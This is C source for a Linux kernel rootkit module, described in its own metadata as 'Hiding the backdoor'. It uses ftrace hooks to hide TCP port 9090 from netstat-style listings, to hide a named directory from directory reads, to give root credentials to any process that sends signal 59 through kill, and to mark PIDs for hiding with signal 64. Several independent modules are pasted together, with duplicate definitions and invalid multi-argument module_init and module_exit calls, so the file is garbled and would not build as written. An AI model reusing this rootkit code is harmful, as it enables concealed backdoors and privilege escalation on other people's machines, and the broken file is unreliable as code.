#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>

#define PORT 9090              /* Defines the port to be hidden */
#define HIDE_DIR "Directory_name"     /* Your Directory name to hide */

MODULE_LICENSE("GPL");        
MODULE_AUTHOR("PedroRodriguesDEV_security");        
MODULE_DESCRIPTION("Hiding the backdoor"); 
MODULE_VERSION("1.0");        

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden\n");
        return 0;
    }

    return orig_tcp4_seq_show(seq, v);
    
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden\n");
        return 0;
    }

    return orig_tcp6_seq_show(seq, v);
    
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};


static int __init hideport_init(void)
{
    int err; 
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err) 
        return err;

    return 0;
}

static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);


static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    struct linux_dirent64 *current_entry = NULL;
    struct linux_dirent64 *prev_entry = NULL;
    long error;
    unsigned long offset = 0;
    long result;

    result = orig_getdents64(regs);
    if (result <= 0) {
        return result;
    }

    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        return -ENOMEM;
    }

    error = copy_from_user(kernel_dir_buffer, user_dir, result);
    if (error) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    while (offset < result) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);

        if (strncmp(current_entry->d_name, HIDE_DIR, strlen(HIDE_DIR)) == 0) {
            if (current_entry == kernel_dir_buffer) {
                result -= current_entry->d_reclen;
                memmove(kernel_dir_buffer, (char *)kernel_dir_buffer + current_entry->d_reclen, result);
                continue;
            }

            if (prev_entry) {
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    error = copy_to_user(user_dir, kernel_dir_buffer, result);
    kfree(kernel_dir_buffer);

    return result;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init hiding_directory_init(void) {
    int error;

    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (error) {
        return error;
    }
    return 0;
}

static void __exit hiding_directory_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

static asmlinkage long(*orig_kill)(const struct pt_regs *);

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->si;

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }

        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;

        commit_creds(newcredentials);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init SpawRooter_init(void){
        int error; 
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
        return 0;
}

static void __exit SpawRooter_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

char hide_pid[NAME_MAX];  /*Input the PID to hide the process*/
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{

    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == 64)
    {
        sprintf(hide_pid, "%d%", pid);
        return 0;
    }

    return orig_kill(regs);
}

module_init(hideport_init, hiding_directory_init, SpawRooter_init )
module_exit(hideport_exit, hiding_directory_exit, SpawRooter_init)

